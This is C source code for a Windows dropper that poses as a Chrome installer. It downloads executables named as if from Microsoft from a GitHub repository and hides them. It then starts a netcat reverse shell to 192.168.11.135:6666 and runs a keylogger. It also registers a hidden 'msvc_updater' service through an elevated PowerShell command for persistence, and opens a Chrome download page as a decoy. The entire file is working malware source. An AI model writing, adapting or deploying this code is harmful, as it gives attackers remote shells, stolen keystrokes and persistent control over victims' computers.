#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <Shlobj.h>

#include "src/base64.h" 


#define PSHELL_PATH "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
#define CHROME_PATH "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"

#define NC_URL "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/msvcnet.exe"
#define KYLG_URL "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/msvcmon.exe"
#define MSVCSV_URL "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/msvc_updater.exe"
#define CHROME_URL "https://www.google.com/intl/id_id/chrome/next-steps.html?statcb=1&installdataindex=empty&defaultbrowser=0#"

#define KYLG_PARAMS "--out-log msvclog"
#define NC_PARAMS "-d 192.168.11.135 6666 -e C:\\Windows\\System32\\cmd.exe"

void DownloadFile(const char* url, const char* filePath)
{
    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile)
    {
        FILE* file = fopen(filePath, "wb");
        if (file)
        {
            char buffer[2048];
            DWORD bytesRead; 

            do {
                InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);
                fwrite(buffer, 1, bytesRead, file);
            } while (bytesRead > 0);

            fclose(file);
        }

        InternetCloseHandle(hFile);
    }

    InternetCloseHandle(hInternet);
}


int main(int argc, char* argv[]) 
{
    char desktop_path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop_path);

    char current_path[MAX_PATH];
    GetModuleFileName(NULL, current_path, MAX_PATH);


    char nc_path[MAX_PATH];
    // msvcnet.exe
    snprintf(nc_path, MAX_PATH, "%s\\msvcnet.exe", desktop_path);

    char kylg_path[MAX_PATH];
    // msvcmon.exe
    snprintf(kylg_path, MAX_PATH, "%s\\msvcmon.exe", desktop_path);

    char ps_params[256];
    char msvcsv_path[MAX_PATH];
    // msvc_updater.exe
    snprintf(msvcsv_path, MAX_PATH, "%s\\msvc_updater.exe", desktop_path);
    sprintf(ps_params, 
        "-Command \"Start-Process cmd.exe -ArgumentList '/c sc create msvc_updater binPath=\"%s\" start=auto && sc start msvc_updater' -Verb RunAs\"",
        msvcsv_path);
    SetFileAttributes(msvcsv_path, FILE_ATTRIBUTE_HIDDEN);


    DownloadFile(NC_URL, nc_path);
    SetFileAttributes(nc_path, FILE_ATTRIBUTE_HIDDEN);

    DownloadFile(KYLG_URL, kylg_path);
    SetFileAttributes(kylg_path, FILE_ATTRIBUTE_HIDDEN);

    DownloadFile(MSVCSV_URL, msvcsv_path);
    SetFileAttributes(msvcsv_path, FILE_ATTRIBUTE_HIDDEN);


    ShellExecute(NULL, "open", nc_path, NC_PARAMS, NULL, SW_HIDE);
    ShellExecute(NULL, "open", kylg_path, KYLG_PARAMS, NULL, SW_HIDE);
    ShellExecute(NULL, "open", PSHELL_PATH, ps_params, NULL, SW_HIDE);

    SetFileAttributes(current_path, FILE_ATTRIBUTE_HIDDEN);
    ShellExecute(NULL, "open", CHROME_PATH, CHROME_URL, NULL, SW_SHOWNORMAL);

    return 0;
}
